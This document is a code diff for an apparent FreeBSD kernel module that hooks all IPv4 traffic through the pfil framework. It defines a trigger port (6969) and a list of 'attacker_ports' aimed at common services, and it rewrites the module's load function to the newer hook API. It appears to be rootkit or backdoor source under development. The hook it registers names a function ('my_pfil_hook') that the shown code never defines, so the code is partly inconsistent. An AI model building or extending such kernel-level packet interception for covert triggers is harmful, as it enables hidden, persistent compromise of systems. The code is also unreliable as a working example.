@@ -15,7 +15,8 @@
 #include <sys/sysproto.h>
 #include <sys/exec.h>
 #include <net/pfil.h>
-
+#include <netinet/ip_var.h>
+#include <net/if.h>
 
 #define TRIGGER_PORT 6969
 
@@ -23,15 +24,42 @@
 static int attacker_ports[] = {22, 80, 443, 8080, 3306, 5432, 21, 25, 587, 53}; // List of target ports
 
 
-// pfil_head is a list of the all the filtering functions applied to incoming/outgoing packets
-// pfh_inet is the global IPv4 packet filtering subsystem
-static struct pfil_head *pfh_inet;
+
 
 
 // good till here
 
 
+// pfil_head is a list of the all the filtering functions applied to incoming/outgoing packets
+// pfh_inet is the global IPv4 packet filtering subsystem
+static struct pfil_hook *my_hook;
 
+
+// Load function: Attach our packet filter
+static int load(void) {
+
+    struct pfil_hook_args pha = {
+        .pa_version = PFIL_VERSION,         // Version of the pfil framework
+        .pa_flags = PFIL_IN | PFIL_OUT,     // Flags for filtering incoming and outgoing packets
+        .pa_type = PFIL_TYPE_AF,            // Type of filter (address family)
+        .pa_mbuf_chk = my_pfil_hook,        // Function to process packets
+        .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
+        .pa_ruleset = NULL,                 // No custom ruleset (set to NULL if unused)
+        .pa_modname = "my_module",          // Module name
+        .pa_rulname = "my_rule"             // Rule name
+    };
+
+    // pfil_hook_t	pfil_add_hook(struct pfil_hook_args *);
+    my_hook = pfil_add_hook(&pha);
+
+    if (my_hook == NULL) {
+        // Handle error
+        return (ENOMEM);
+    }
+
+    printf("[LKM] Packet filter module loaded\n");
+    return 0;
+}
 
 
 
@@ -134,23 +162,6 @@ static int packet_filter(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir
 
 
 
-
-
-
-
-
-
-// Load function: Attach our packet filter
-static int load(void) {
-    // Get the IPv4 packet filter hook
-    pfh_inet = pfil_head_get(PFIL_TYPE_AF, AF_INET);
-    if (pfh_inet != NULL) {
-        // Creates a custom packet fitlering function packet_filter
-        pfil_add_hook(packet_filter, NULL, PFIL_IN | PFIL_WAITOK, pfh_inet);
-    }
-    printf("[LKM] Packet filter module loaded\n");
-    return 0;
-}
 
 
 // Unload function: Remove our filter
